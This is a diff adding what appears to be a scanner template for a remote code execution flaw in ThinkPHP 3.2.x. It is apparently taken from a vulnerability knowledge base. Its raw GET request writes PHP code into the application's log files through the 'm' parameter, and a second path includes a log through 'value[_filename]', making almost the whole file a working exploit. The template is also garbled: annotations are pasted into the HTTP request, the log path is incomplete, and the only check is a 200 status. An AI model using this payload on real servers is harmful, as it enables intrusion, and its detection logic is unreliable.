@@ -1,0 +1,52 @@
+id: poc-bahq4tazgtskp1mx
+info:
+  name: thinkphp32x_rce
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bahq4tazgtskp1mx'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bahq4tazgtskp1mx
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /index.php?m=--%3E%3C?=md5(1);?%3E HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+
+    Accept-Language: en-GB,en;q=0.5
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+    Cookie: PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66;
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
